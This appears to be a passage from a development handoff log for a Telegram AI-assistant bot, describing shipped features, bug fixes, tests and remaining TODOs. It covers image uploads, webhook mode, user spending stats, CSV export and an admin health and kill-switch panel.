multi-image, helper edge cases including bytes / list / dict / non-list / non-string entries) plus 2 in `test_ai_engine.py` (image URI persistence is keyword-only on the user-row write; assistant write does NOT include the kwarg).
* **Token / cost accounting for image turns** — vision images consume input tokens (a 1024×1024 image is ~765 tokens for GPT-4V; varies per model). The existing `pricing.calculate_cost_async` only takes `(active_model, prompt_tokens, completion_tokens)` — those values come back from OpenRouter's `usage` block, which already includes the image-token contribution, so this *should* be transparent. Verify with a real OpenRouter response that the `prompt_tokens` field reflects the image cost; if it does, this is already correct. If not, factor in a per-model multiplier.
* ✅ **HEIC / unsupported-mime rejection path** — shipped in Stage-15-Step-E #10 follow-up #1. New `@router.message(F.document)` handler `process_image_document` filters to `mime_type.startswith("image/")` and replies with the localised `ai_image_document_instruction` slug ("send as Photo, not File"). Non-image documents (PDFs, archives, audio) pass through silently so a future doc handler can be added without colliding. Server-side HEIC conversion (option (b) — install Pillow + `pillow-heif` and convert in the hot path) deliberately NOT taken: doubles the install footprint, adds a CPU-bound memory-heavy operation per upload, and Telegram's "Photo" attach mode already converts client-side to JPEG for free. Telling the user to flip the attach mode is a one-tap fix.
* **Multi-image messages** — the helper supports up to `MAX_IMAGES_PER_MESSAGE` images per turn but the handler currently only routes single `F.photo` messages. To support a media group (album) the handler would need to buffer media-group updates by `message.media_group_id`, accumulate the data URIs across the group, and fire one `chat_with_model` call when the album is complete. Non-trivial because aiogram doesn't natively coalesce media groups — would need a small in-memory dict keyed by `media_group_id` with a debounce timer.
* **Per-image cost transparency** — the wallet UI / charge log doesn't currently surface "this $X charge included a vision image". Could be useful for a power user trying to budget. Out of scope.

Bundled bug fix in Stage-15-Step-E #10 follow-up #2: **`handlers.process_photo` pre-flight vision check let blank `active_model` rows fall through, wasting a Telegram CDN download + base64 encode for an obviously-doomed turn.** Pre-fix, the photo handler did `active_model = (user_row.get("active_model") or "").strip()` and then `if active_model and not is_vision_capable_model(active_model): reject`. The `if active_model and ...` short-circuited to False for any NULL / blank / whitespace-only `users.active_model` row, so the photo passed the pre-flight gate even though `chat_with_model` would shortly reject the same call: `_resolve_active_model` falls back to `openai/gpt-3.5-turbo` (text-only) for a corrupted row, so the user paid the cost of (a) the Telegram CDN round-trip (`get_file` + `download_file`), (b) base64 encoding the bytes, (c) waiting for OpenRouter handshake setup before getting the same `ai_model_no_vision` rejection. A row with NULL `active_model` is rare but real (post-migration / pre-onboarding edge case where the row exists for FK reasons but the `/start` flow hadn't completed). Fix: route the pre-flight through `_resolve_active_model` (now exported from `ai_engine`) so the pre-flight uses the same fallback `chat_with_model` would, and drop the `if active_model and ...` guard so `is_vision_capable_model("openai/gpt-3.5-turbo")` rejects at the gate. Three new parametrised regression tests in `test_process_photo.py` (`test_process_photo_blank_active_model_rejected_at_preflight` over None / "" / "   ") pin the gate-fires-without-CDN-download invariant.

Bundled bug fix in PR #129 (real, follow-up to the original Step-E #10 symptom-fix): **`database.append_conversation_message` silently dropped NUL-bearing memory turns instead of preserving them.** Pre-fix, PR #129 (Stage-15-Step-E #10 first slice) wrapped the `ai_engine.chat_with_model` call site in a defensive try/except so a `\x00` NUL byte in the prompt or reply wouldn't lose the AI reply (and double-bill on retry). That fix handles the symptom — the user gets their reply, the wallet isn't charged twice — but the underlying memory turn is **still discarded** because the INSERT raises before any row is written. So a memory-enabled user who happens to send a NUL-bearing prompt has gaps in their conversation buffer for both the user side AND the assistant side, and on each subsequent turn the model's context is missing the most recent exchange. Telegram clients DO let users send U+0000 (paste from a binary file, certain Android emoji-keyboard bugs), so this isn't theoretical. Root-cause fix: strip the `\x00` byte at the database layer (`database.append_conversation_message`) before the INSERT, preserving every other character (Postgres TEXT only rejects U+0000 — every other Unicode code point including the rest of the C0/C1 control range is accepted). The PR #129 wrap upstream becomes a backstop for the *other* failure modes it was originally designed to cover (transient disconnect, deadlock, FK violation on concurrent user-row delete). Loud-and-once WARN log when the strip fires so ops can investigate the source. Six new regression tests in `test_database_queries.py` (`test_append_conversation_message_strips_nul_bytes`, `test_append_conversation_message_no_nul_no_log`, `test_append_conversation_message_strip_then_truncate`, `test_append_conversation_message_only_nul_persists_empty`, `test_append_conversation_message_unicode_preserved_around_nul`, `test_append_conversation_message_invalid_role_still_rejected`) pin every branch.

---

##### Stage-15-Step-E #3 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #3 (Webhook mode instead of long-polling) — STARTED in PR-after-Step-E-#2.**

Original spec (Step-E table row 3): "switch from aiogram long-polling to webhook mode. The aiohttp server already runs; register a `/telegram-webhook` route. Reduces latency, uses fewer resources."

What's shipped this PR:

* `telegram_webhook.py` — new module with the webhook plumbing. `is_webhook_mode_enabled()` is the boot-decision predicate; `load_webhook_config()` is the strict parser (validates secret charset/length per Telegram's spec, requires HTTPS base URL except for `localhost`, refuses missing base URL); `install_telegram_webhook_route(app, dp, bot, config)` mounts the POST handler at `/telegram-webhook/<secret>` using `aiogram.webhook.aiohttp_server.SimpleRequestHandler` (which enforces the `X-Telegram-Bot-Api-Secret-Token` header — defence in depth on top of the secret-in-path); `register_webhook_with_telegram(bot, cfg)` calls `Bot.set_webhook` with `drop_pending_updates=False` so a switch from polling to webhook doesn't lose buffered updates; `remove_webhook_from_telegram(bot)` is best-effort on shutdown (logs but doesn't raise so the original shutdown reason isn't masked).
* `main.py` — opt-in switch. When `TELEGRAM_WEBHOOK_SECRET` is set, `start_webhook_server` mounts the Telegram route on the same aiohttp app + port as the IPN webhooks, registers the path with the rate limiter, then `main()` calls `set_webhook` and blocks on an `asyncio.Event` for the lifetime of the process. When unset, the existing `dp.start_polling(bot)` path runs unchanged — backward-compatible default.
* `.env.example` — documents `TELEGRAM_WEBHOOK_SECRET`, `TELEGRAM_WEBHOOK_BASE_URL` (optional override), `TELEGRAM_WEBHOOK_PATH_PREFIX` (optional override). Includes a recovery procedure ("unset this var and call delete_webhook") for ops that flip back to polling.
* 27 new tests in `tests/test_telegram_webhook.py` covering: env-var validation (disabled/whitespace/happy-path/specific-overrides/trailing-slash strip/custom prefix/missing base URL/plain HTTP rejection/localhost allow/secret charset/secret length); `WebhookConfig.__repr__` not leaking the secret; `constant_time_secret_eq` (true/false/empty-string defence); route registration; `Bot.set_webhook` called with the right args; `delete_webhook` swallowing errors. Plus tests for the bundled rate-limit fix (default paths includes TetraPay; `register_rate_limited_webhook_path` extends the set; idempotent; raises before install; rate-limits TetraPay end-to-end; admin traffic still pass-through).

What remains (next AI's TODO):

* ✅ **`set_webhook` retry on transient 5xx** — shipped in Stage-15-Step-E #3 follow-up #1. New `register_webhook_with_retry` wraps `register_webhook_with_telegram` in a retry loop that tolerates `TelegramServerError` and `TelegramNetworkError` (3 attempts by default, 1s/2s exponential backoff, configurable via `TELEGRAM_WEBHOOK_REGISTER_MAX_ATTEMPTS` and `TELEGRAM_WEBHOOK_REGISTER_BASE_DELAY_SECONDS`). `TelegramBadRequest` is **not** retried — that's a deploy-side typo, not a Telegram blip.
* ✅ **IP-allowlist for Telegram's address ranges** — shipped in the same follow-up. Opt-in via `TELEGRAM_WEBHOOK_IP_ALLOWLIST` env var. Set to `default` for Telegram's documented delivery ranges (`149.154.160.0/20`, `91.108.4.0/22`); supply a comma-separated CIDR list for custom topologies. Defence-in-depth on top of the secret check; default-off so existing deploys aren't accidentally locked out.
* ✅ **Health-check route** — shipped in the same follow-up. `GET /telegram-webhook/healthz` returns a tiny `{"status":"ok","webhook_prefix":"/telegram-webhook"}` JSON; 200 OK. Stateless (doesn't talk to Telegram or the DB on every probe), unauthenticated (the body carries no secret), not rate-limited (so a load balancer probing every 5s can't fight the bucket against real updates).
* **Multi-bot `TokenBasedRequestHandler`** — current handler is `SimpleRequestHandler` (one bot per process). If the operator ever wants to run multiple bots on the same aiohttp server, swap to `TokenBasedRequestHandler` (path placeholder `{bot_token}`) — but note aiogram's docstring warning about token-in-URL leakage to reverse-proxy logs.
* **Migration recipe** — README has a one-liner pointing at `.env.example`; could be expanded into a step-by-step guide ("Set `TELEGRAM_WEBHOOK_SECRET` → restart bot → verify with `Bot.get_webhook_info`").

Bundled bug fix in this PR: **`webhook_rate_limit_middleware` now protects the TetraPay endpoint** (and the new opt-in Telegram webhook) instead of just `/nowpayments-webhook`. Pre-fix, `WEBHOOK_PATH = "/nowpayments-webhook"` was hardcoded as the only filtered path, so the TetraPay endpoint added in Stage-11-Step-C (`main.start_webhook_server` line ~53) bypassed the per-IP token bucket entirely — a flood of forged TetraPay callbacks could DoS the JSON-parse + signature-verify path while NowPayments IPNs and admin-panel traffic stayed untouched. Fix introduces a `WEBHOOK_RATE_LIMITED_PATHS_KEY` AppKey carrying a `set[str]` (defaults: `{WEBHOOK_PATH, "/tetrapay-webhook"}`) and a public `register_rate_limited_webhook_path(app, path)` helper for callers (like the new Telegram webhook) that mount their own routes. The middleware now membership-tests against this set instead of comparing against a single hardcoded constant. Test `test_rate_limit_middleware_now_filters_tetrapay` pins the regression with a single-token bucket — pre-fix the second TetraPay request would have returned 200; post-fix it correctly returns 429.

---

##### Stage-15-Step-E #2 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #2 (Spending analytics for users) — STARTED in PR-after-Step-E-#1.**

Original spec (Step-E table row 2): "show users their own spending dashboard: total spent, per-model breakdown, daily/weekly graphs. Currently only admins see metrics. Add a `/stats` command or wallet-menu button."

What's shipped this PR:

* `Database.get_user_spending_summary(telegram_id, *, window_days=30, top_models_limit=5)` — new aggregate method returning `{lifetime, window_days, window, top_models}`. Hard-codes `WHERE telegram_id = $1` on every sub-query (same defensive shape as `list_user_transactions`); raises `ValueError` on a non-positive `telegram_id` so a buggy caller can't leak someone else's totals. Window-days clamped to `[1, 365]`; top-models limit clamped to `[1, 5]`.
* `user_stats.py` — new pure-function module. `format_stats_summary(snapshot, lang, *, balance_usd=None)` renders the snapshot as a Markdown body for the new wallet sub-screen. Empty-data short-circuit (zero usage logged → friendly placeholder, not a wall of zeroes). NaN/Inf defence on every numeric field. Long OpenRouter slugs truncated to 50 chars with ellipsis to keep the message under Telegram's 4 KB cap. Skips the balance line entirely when `balance_usd` is non-finite or negative — same "no row beats a misleading row" policy as `wallet_display.format_toman_annotation`.
* `handlers.hub_stats_handler` — new `hub_stats` callback wired to a "📊 My usage stats" button on the wallet menu. Fetches the snapshot + the user's wallet balance in one screen so a user looking at "how much have I spent" doesn't have to bounce back to the wallet to see "how much do I have left". Defensive against `ValueError` from the DB layer (renders empty-state instead of 500), against NaN balance (clamped to 0 + then dropped by the formatter's own guard), against the `TelegramBadRequest: message is not modified` race that hits any edit-back-to-same-text screen.
* New i18n strings (FA + EN): `btn_my_stats`, `stats_title`, `stats_balance_line`, `stats_empty`, `stats_lifetime_header`, `stats_lifetime_line`, `stats_window_header`, `stats_window_line`, `stats_top_models_header`, `stats_top_models_line`.
* 26 new tests in `tests/test_user_stats.py` covering the DB method (zeros / populated / clamping / user-scope filter / refusal on non-positive id), the formatter (every section + every defensive guard), and the handler (populated / empty / FSM clear / DB ValueError / NaN balance). Plus a smoke test ensuring every new string key exists in both `fa` and `en`.

What remains (next AI's TODO):

* ✅ **`/stats` slash-command alias** — shipped in the Stage-15-Step-E #2 follow-up. `cmd_stats` (`@router.message(Command("stats"))`) renders the same screen as the wallet-menu button but as a fresh message bubble (`message.answer`) instead of an in-place edit. Optional positional arg picks a non-default window: `/stats 7` / `/stats 90` / `/stats 365`. Garbage args (`/stats abc`) silently coerce to the default — same forgiveness policy as the receipts-pagination cursor. Both the slash and the wallet-menu paths route through `_build_stats_render`, so the two surfaces can never drift on copy or layout.
* ✅ **Window selector buttons (7d / 30d / 90d / 365d)** — shipped in the same follow-up. Top-row inline keyboard on the stats screen; the currently-selected window is prefixed with `✓` so the user can tell which one they're on without scrolling. Callback shape `stats_window:<days>` — parsed by `stats_window_select_handler`; an unrecognised value (stale-deploy callback, hand-crafted client) falls back to the 30d default rather than 500-ing. Re-uses `_build_stats_render` so the entire pipeline is one definition.
* ✅ **Per-day breakdown (ASCII bars)** — shipped in the Stage-15-Step-E #2 follow-up #3. New `Database.get_user_daily_spending(telegram_id, days)` groups `usage_logs` by `date_trunc('day', created_at)::date` over the requested rolling window, returning `{"date": "YYYY-MM-DD", "calls": int, "cost_usd": float}` rows oldest-first; the user-facing renderer (`user_stats._format_daily_bars`) emits one row per day in a fenced code block (`█` filled / `░` empty), with bar widths proportional to `cost / max(cost)` over the visible window. Missing days inside the window are padded as zero-height bars so the date axis stays continuous from oldest → newest. Image-based graphs are still out of scope — the bar chart is rendered as monospaced text inside Telegram's existing message envelope, no new dependency surface needed.
* **Per-week / longer-period graphs** — `get_user_daily_spending` returns daily granularity only; a weekly bucket would need either a new query (`date_trunc('week', created_at)`) or formatter-side aggregation. Punting until product confirms the granularity is needed — the 30 / 90 / 365-day windows already let the user see month-over-month patterns at a glance.
* **Image-based graphs** — would need a separate dependency surface (`matplotlib` / `Pillow`) which is **explicitly out of scope** until the operator approves the new dep.
* ✅ **CSV export of full `usage_logs`** — shipped in the Stage-15-Step-E #2 follow-up #4 (PR-after-#153). New `Database.export_user_usage_logs(telegram_id, *, limit=None)` query (oldest-first sort so the CSV reads top-to-bottom in chronological order; clamped at the DB layer to `USAGE_LOGS_EXPORT_MAX_ROWS` = 50 000), new pure-function module `usage_csv_export.py` (mirrors `conversation_export.py`'s shape — RFC-4180 with UTF-8 BOM for Excel auto-detection, `\n` line terminator, six-fractional-digit cost precision matching `cost_deducted_usd DECIMAL(10,6)`, front-trim oldest rows when over `EXPORT_MAX_BYTES` = 5 MB, returns `(csv_bytes, kept_count)` so the caller can surface the real count post-trim). New `usage_export` callback handler mounted on the existing `/stats` keyboard ("📤 Download usage CSV" button on its own row above back+home), plus a `/usage_csv` slash-command alias re-using the shared private builder so the two surfaces cannot drift on filename / encoding / trim semantics. Slash path is rate-limited via `consume_chat_token` (same chat-token bucket as AI prompts); callback path is not (Telegram's own callback debounce is the soft cap). Filename pattern `meowassist-usage-<telegram_id>-<UTC date>.csv` matches the conversation-history export's pattern.
* **Schema-rotation hook** — if the operator ever needs to "reset" a user's stats without deleting their wallet history, document that this is `DELETE FROM usage_logs WHERE telegram_id = $1`. Currently the only data-deletion surfaces are `mem_reset` (conversation buffer) and the admin panel's user-deletion flow.

Bundled bug fix in this PR (real, found during code review of the Step-E #1 export module): **`conversation_export.format_history_as_text` now returns `(text, kept_count)` instead of just `text`.** Pre-fix, the handler called `t(lang, "memory_export_caption", count=len(rows))` and `t(lang, "memory_export_done", count=len(rows))` — but `format_history_as_text` may have trimmed older messages to stay under the 1 MB `EXPORT_MAX_BYTES` cap. The in-file header reflected the truth (`Messages: 10 (trimmed 10 oldest)`) but the caption + toast both lied (`Conversation history (20 messages)`) for any user heavy enough to trigger the trim. Fix returns the actually-kept count alongside the rendered text and the handler now uses that. Test `test_memory_export_handler_caption_uses_kept_count_after_trim` pins the regression with a 2 MB simulated buffer.

---

Audit findings (2026-04-30) noted by reading every file — kept here so a future AI / human can pick the highest-leverage one next:

* **`cmd_start` has a redundant `db.create_user` call** (handlers.py ~278) — `UserUpsertMiddleware` already runs first. Inspected during the Stage-13-Step-Aplus audit and decided NOT to remove: the middleware swallows upsert exceptions (logged + handler still runs), so the explicit retry in `cmd_start` is the only safety net for a transient DB issue at the moment of `/start`. Belt-and-braces; leave it.
* ~~`cmd_start` ignores `/start <payload>`~~ — fixed in this PR (Stage-13-Step-C). The bundled bug-fix that the audit had been holding for this stage. `cmd_start` now consults `referral.parse_referral_payload` and dispatches to `db.claim_referral` for `ref_<code>` payloads. A future PR can extend the same parser to handle `promo_<code>` auto-apply or any other deep-link prefix.
* ~~`ai_engine.chat_with_model` doesn't NaN-guard `balance_usd`~~ — re-audited 2026-04-30 while preparing Stage-13-Step-B; turns out this guard already exists at `ai_engine.py` lines 78–84 (added in an earlier PR — the audit note in the previous handoff refresh was wrong). Replaced with a *real* bug found during the same re-audit: **`ai_engine.chat_with_model` forwarded a literal `None` for OpenRouter 200 responses with `content: null`** (tool-call shape, upstream policy refusals). That `None` then hit Telegram via `message.answer(None)` and crashed with `Bad Request: message text is empty`. Fixed in PR #108 (Stage-13-Step-B) at both the source (`ai_engine`) and the handler (`process_chat`) — defence in depth.
* ~~`wallet_text` and `redeem_ok` rendering paths still leak `$nan` for a corrupted `balance_usd` row~~ — discovered while preparing Stage-13-Step-B by re-reading the comment on the `_hub_text_and_kb` fix. The comment claimed PR #101 had already added the guard for `wallet_text` via `format_balance_block`, but `format_balance_block` was never wired into the wallet handlers. Fixed in this PR (Stage-13-Step-Aplus) at all three call sites (`hub_wallet_handler`, `back_to_wallet_handler`, `_redeem_code_for_user`).
* **No structured metrics export** for the per-loop drop counters / heartbeats — `payments.py` and `tetrapay.py` both already expose `get_ipn_drop_counters()` but nothing reads them outside the admin DM body. Becomes Stage-13-Step-D.
* **Pre-commit hooks not configured.** No `.pre-commit-config.yaml`. Not a bug; the user's working agreement (§11) doesn't require them, and CI runs the same checks on every PR. Noted for completeness.
* **`docker-compose.yml` doesn't mount the alembic migrations as a volume** — every schema change requires a `--build`. Acceptable for the user's deploy cadence (manual `git pull && docker compose up -d --build` per §11). Noted for completeness.
* ~~**`bot_commands.ADMIN_ONLY_COMMANDS` is missing the three `/admin_role_*` commands shipped in Stage-15-Step-E #5.**~~ ✅ **fixed (Stage-15-Step-E #8b — Stripe-removal docs PR bundled bug fix, 2026-05-01).** The role-system PR added handlers for `/admin_role_grant`, `/admin_role_revoke`, `/admin_role_list` in `admin.py` but didn't update `bot_commands.ADMIN_ONLY_COMMANDS`, so the per-admin slash menu (published via `Bot.set_my_commands(scope=BotCommandScopeChat(...))` on every startup) silently advertised every admin command except those three. The handlers still worked (gating is in `admin.is_admin`, not on what's in the menu), but admins typing `/` in the bot chat saw no autocomplete entry for the role-CRUD commands — they had to remember the exact name from the `/admin` hub message. Fix adds the three entries to `ADMIN_ONLY_COMMANDS`. Two new tests scan `admin.py` for every `@router.message(Command("..."))` decorator and pin both directions: every registered admin handler must be in the slash menu (catches the next "shipped a handler, forgot the menu entry" regression at PR time), and every menu entry must have a matching handler (catches a typo like `admin_role_revoek` that would advertise a no-op command). Plus a direct regression pin asserting the three role commands by name.
* ~~**`ai_engine.chat_with_model` could lose the AI reply (and silently double-bill on retry) when a memory-enabled user's persistence INSERT raised after settlement.**~~ ✅ **fixed (Stage-15-Step-E #10 bundled bug fix, 2026-05-01).** The two `db.append_conversation_message` calls at lines 316-317 lived inside the function's outer `try/except Exception` block. If either raised — concretely a `\x00` NUL byte in the prompt or reply (Postgres TEXT rejects with `invalid byte sequence for encoding "UTF8": 0x00`; Telegram does allow U+0000 in user messages), a transient DB hiccup, a deadlock, or an FK violation if the user row was deleted concurrently — the broad except swallowed the `reply_text` and surfaced `ai_transient_error`. But by that point in the flow `deduct_balance` (line 293) and `log_usage` (line 306) had ALREADY committed, so the user's natural retry would re-charge them. Net: silent double-billing whenever a NUL-bearing message went through the pipeline. Fix wraps the two appends in a local try/except so persistence becomes best-effort — the wallet debit stands, the reply goes back to the user, and the persist failure is logged loud-and-once at ERROR level for ops to spot. Three regression tests pin the user-side raise, the assistant-side raise, and the no-persist-when-memory-off path so a future refactor can't silently re-introduce the wrap-with-broad-try regression.
* ~~**Zarinpal drop counters were never wired into the dashboard's IPN-health tile or the Prometheus exposition.**~~ ✅ **fixed (Stage-15-Step-E #9 bundled bug fix, 2026-05-01).** Stage-15-Step-E #8 (PR #126) shipped the Zarinpal gateway with a per-process `_ZARINPAL_DROP_COUNTERS` registry and an export accessor `get_zarinpal_drop_counters()` whose docstring even noted "same shape as `get_tetrapay_drop_counters` so a future "add Zarinpal panel" pass to `web_admin._collect_ipn_health` can plug straight in" — but the consumers were never updated, so the dashboard tile rendered NowPayments + TetraPay only, and the `/metrics` endpoint exposed `meowassist_ipn_drops_total{reason="..."}` + `meowassist_tetrapay_drops_total{reason="..."}` but no Zarinpal family. An operator alerting on `meowassist_*_drops_total{reason="bad_signature"}` was blind to Zarinpal verify failures. Fix: extend `_collect_ipn_health` to call `zarinpal.get_zarinpal_drop_counters()` behind its own `try` (matching the defensive pattern the other halves use), add a third Zarinpal section to `templates/admin/dashboard.html`, and emit a third `meowassist_zarinpal_drops_total{reason="..."}` labelled counter from `metrics.render_metrics`. Five new regression tests cover the dashboard tile (drop-count rendering + all-zero placeholder), the `_collect_ipn_health` shape (third sub-dict + `zarinpal_total`), the resilience-to-accessor-failure path, and the Prometheus exposition (per-reason rows + `# TYPE` declaration + sort order).

---

#### Stage-15-Step-F: Bot health & emergency control panel (queued 2026-05-01)

The user asked for a single page in the web admin showing the bot's
*current* health classification (idle / under pressure / under attack
/ down / etc.) plus a force-stop button and master kill-switches —
"every thing i need to have in my hands for times that is bot is
crashing or not responding or under attack". Stage-15-Step-F is that
panel.

What this PR ships (first slice — operator-actionable end-to-end):

* **`bot_health.py`** — pure-function module exposing
  `BotStatusLevel` (idle / healthy / busy / degraded / under_attack /
  down), `BotStatus` dataclass, `compute_bot_status(...)` classifier
  (severity ordering DOWN > UNDER_ATTACK > DEGRADED > BUSY >
  HEALTHY > IDLE — the highest-severity signal wins so the operator's
  attention goes to the active threat), `request_force_stop(...)`
  primitive (defaults to SIGTERM + `os.kill(getpid())`, accepts a
  `kill_fn` injection for tests). Tunable thresholds via env vars
  (`BOT_HEALTH_BUSY_INFLIGHT=50`, `BOT_HEALTH_LOOP_STALE_SECONDS=1800`,
  `BOT_HEALTH_IPN_DROP_ATTACK_THRESHOLD=100`,
  `BOT_HEALTH_LOGIN_THROTTLE_ATTACK_KEYS=25`) so the operator can tune
  per-deploy without a code change.
* **`/admin/control`** — new admin page with the traffic-light
  status tile, a live-signals table (in-flight chat slots, IPN drops
  since boot across all gateways, login-throttle active IP count,
  disabled-models / disabled-gateways counts, background loop
  heartbeat ages, process uptime + PID), master kill-switches for
  *all* AI models and *all* payment gateways (one click → one row
  per id in the disabled tables), and a **force-stop** button that
  sends SIGTERM to the bot process. Force-stop requires both CSRF
  + a hidden `confirm=FORCE-STOP` sentinel in the form so a stray
  click on a forwarded URL can't kill the bot. Every POST is
  CSRF-protected and audit-logged via `_record_audit_safe`.
* **`templates/admin/control.html`** + nav-link entry in
  `_layout.html`. Dark-themed status tile colour-coded by severity
  (green→amber→red), sectioned panels for the kill-switches and
  the danger-zone force-stop button (red border + double JS confirm).
* **`meowassist_bot_status_score` Prometheus gauge** — rendered in
  `metrics.render_metrics` so existing alerting rules can target
  `meowassist_bot_status_score >= 4` to page on under-attack / down
  without parsing the level label. Single source of truth across the
  dashboard, the admin panel, and Prometheus.
* **`rate_limit.login_throttle_active_count(app)`** — read-only
  accessor exposing the number of distinct IPs currently in the
  per-IP login-throttle bucket cache. A spike here is one of the
  strongest "under attack" signals because a brute-force login
  spray rotates through fresh keys (the per-key bucket drains
  slowly), so the cache size grows linearly with the number of
  distinct attackers seen this process. Used by both the classifier
  and the panel's signals table.

Bundled bug fix in this PR (real, found while reading
`web_admin.verify_totp_code` to understand how the panel's
auth-aware POSTs would interact with 2FA): **non-ASCII digit
characters were silently rejected by TOTP verification** even
though `str.isdigit()` accepted them. The bot's primary user base
is Persian; an admin pasting their authenticator code from a
Persian-locale clipboard would type the code in Persian digits
(`۱۲۳۴۵۶` U+06F0..U+06F9) and see a confusing "Invalid 2FA code"
error rather than logging in — the format-check accepted Persian
digits as "isdigit", but `pyotp.TOTP.verify` then rejected the
non-ASCII string and raised into the broad-except, so the
operator just saw the generic error path. Fix is two-step:
(1) translate Persian (U+06F0..U+06F9) and Arabic-Indic
(U+0660..U+0669) digits to ASCII before validation via a
module-level `str.maketrans` table — built once at import time so
each verify call is a single O(n) `str.translate` walk; (2)
tighten the format check to `isascii() and isdigit() and len == 6`
so any *remaining* non-ASCII digit class (Bengali, full-width,
mathematical, …) fails fast with `False` rather than reaching
pyotp and raising into the broad-except. Four new regression tests
pin: ASCII-Persian round-trip, Arabic-Indic, mixed-script (a
half-typed half-pasted code), and the rejection path for Bengali
+ full-width.

What remains for a follow-up PR:

* **Tunable severity thresholds via the admin panel** — currently
  `BOT_HEALTH_*` are read from env at `compute_bot_status` call-site
  (so operators must restart to change them). A future slice could
  surface them as editable fields on `/admin/control` and persist to
  the DB (`Database.set_setting(key, value)` already exists for
  similar use-cases in Stage-12).
* **Attack-pattern analytics** — `/admin/control` shows the *current*
  classification but not the *history*. A follow-up could add a
  rolling-window timeline (last 1h / 6h / 24h) of the level changes
  driven by the existing audit-log table.
* **Proactive Telegram-DM alerts on degraded/under-attack** —
  *shipped in Stage-15-Step-F follow-up #1 (`bot_health_alert.py`)*.
  See that section below.
* **Per-loop "freshness" thresholds** —
  *shipped in Stage-15-Step-F follow-up #2 (`bot_health.LOOP_CADENCES`)*.
  See that section below.

Files in this PR (Stage-15-Step-F):

* `bot_health.py` (new)
* `web_admin.py` — `_FARSI_ARABIC_DIGIT_TRANSLATION` table +
  digit-normalisation in `verify_totp_code`; new `APP_KEY_FORCE_STOP_FN`;
  6 new route handlers + helpers (`_all_gateway_keys`, `_all_model_ids`,
  `_collect_control_signals`, `_control_csrf_guard`, `control_get`,
  `control_disable_all_models_post`, `control_enable_all_models_post`,
  `control_disable_all_gateways_post`, `control_enable_all_gateways_post`,
  `control_force_stop_post`); 6 new `app.router.add_*` registrations.
* `metrics.py` — `meowassist_bot_status_score` gauge in `render_metrics`.
* `rate_limit.py` — `login_throttle_active_count(app)`.
* `templates/admin/control.html` (new) + nav entry in
  `templates/admin/_layout.html`.
* `tests/test_bot_health.py` (new) — 22 tests for the classifier +
  force-stop primitive + dataclass.
* `tests/test_web_admin.py` — 4 new TOTP-Persian-digits tests + 11
  new `/admin/control` route tests.

---

#### Stage-15-Step-F follow-up #1: Proactive bot-health Telegram DMs (queued 2026-05-01)

The Step-F panel made the *current* state visible to an operator
who's *looking at it*. The user's stated need —
*"every thing i need to have in my hands for times that is bot is
crashing or not responding or under attack"* — also covers the case
where they're not looking at the panel. This follow-up adds a
proactive admin-DM loop so a degraded / under-attack / down event
pages the operator on Telegram the moment it happens.

What this PR ships:

* **`bot_health_alert.py`** (new) — long-running asyncio task that
  wakes every `BOT_HEALTH_ALERT_INTERVAL_SECONDS` (default 60),
  runs the same `bot_health.compute_bot_status` classifier the panel
  + Prometheus use, and DMs admins on transitions to DEGRADED /
  UNDER_ATTACK / DOWN. **Single source of truth for the level** —
  the alert loop, the panel, and the gauge agree, because the loop
  populates a module-level `latest_observed_recent_drops()` cache
  that the panel + `metrics.render_metrics` read.
* **Per-level dedupe + recovery DMs.** A bad level is DMed once per
  `(level, hour-anchor)` so a still-bad state re-fires once per
  hour rather than once per tick. Level *escalation* (e.g.
  DEGRADED → DOWN) re-fires immediately even within the same
  anchor. A bad → good transition fires a single recovery DM
  ("✅ Bot health recovered: healthy (was under_attack)") and
  clears the dispatched-level state so the next bad transition
  re-fires immediately rather than waiting for the next hour.
* **Per-admin fault isolation.** A `TelegramForbiddenError` (admin
  blocked the bot) on admin A doesn't stop admin B's notification.
  A `TelegramAPIError` is logged with stack and skipped — we'd
  rather miss one admin than have the loop die silently and let
  the bot stay quiet during an incident. Mirrors
  `pending_alert.notify_admins_of_stuck_pending`.
* **Wired into `main.main`** alongside the existing background loops
  (`pending_alert`, `pending_expiration`, `model_discovery`,
  `fx_refresher`, `min_amount_refresher`). Cancelled + awaited
  during shutdown so the asyncio loop closes cleanly.
* **Heartbeat metric** — `meowassist_bot_health_alert_last_run_epoch`
  joins the existing `_LOOP_METRIC_NAMES` set so the loop itself
  can be alerted on (a stale alert loop is exactly the kind of
  thing that would silently break this safety net).
* **BUSY does not page.** BUSY is by definition the bot doing real
  work — a heavy-traffic surge it's correctly handling shouldn't
  spam the operator. Only DEGRADED / UNDER_ATTACK / DOWN are in
  the bad-levels set.

Bundled bug fix in this PR (real, found while wiring the alert
loop into `bot_health.compute_bot_status`): **the UNDER_ATTACK
classification on IPN-drop floods used the *since-boot* total
rather than a *recent-window* delta**, so a long-running deploy
that slowly accumulated one bad-signature row a day would, after
~3 months of normal uptime, silently and permanently false-fire
UNDER_ATTACK on the dashboard / panel / Prometheus while nothing
was actually wrong. The fix splits the parameter:
`compute_bot_status` now accepts `ipn_drops_total` (informational —
"N IPN drop(s) since boot" surfaces in the HEALTHY summary) and
`ipn_drops_recent` (rate-window — drives UNDER_ATTACK
classification). The alert loop tracks the previous tick's total
and passes the delta-since-last-tick as `ipn_drops_recent`.
Snapshot callers (Prometheus, `/admin/control`) read the loop's
`latest_observed_recent_drops()` so the panel + the gauge + the
loop classify identically. A new regression test
(`test_long_uptime_drops_total_alone_does_not_trip_attack`) pins
the contract: 10× threshold of since-boot drops with zero recent
drops must classify HEALTHY, not UNDER_ATTACK.

What remains for a follow-up PR:

* **Per-channel routing** — currently every admin DM goes to every
  admin. A future slice could let a deployer route DEGRADED-level
  alerts to a Telegram group while keeping UNDER_ATTACK / DOWN as
  per-admin DMs.
* **Sustained-threshold gating** — a transient one-tick spike (e.g.
  a single chain-confirmation lag flipping `pending_reaper` to
  stale for 30s) currently DMs immediately. A future slice could
  add an "N consecutive ticks at level X" gate before the first
  DM, with the trade-off that the operator hears about real
  incidents 1-N tick-intervals later. The current behaviour favours
  early signal over noise reduction; whether that's the right
  trade-off depends on the deploy's loop cadences.
* **Alert audit log** —
  *shipped in Stage-15-Step-F follow-up #3
  (`bot_health_alert._record_alert_audit`)*. See that section
  below.

Files in this PR (Stage-15-Step-F follow-up #1):

* `bot_health.py` — split `ipn_drops_total` / `ipn_drops_recent`
  parameter on `compute_bot_status`; the bundled bug fix.
* `bot_health_alert.py` (new) — alert loop module.
* `main.py` — `start_bot_health_alert_task` boot + cancel-on-shutdown.
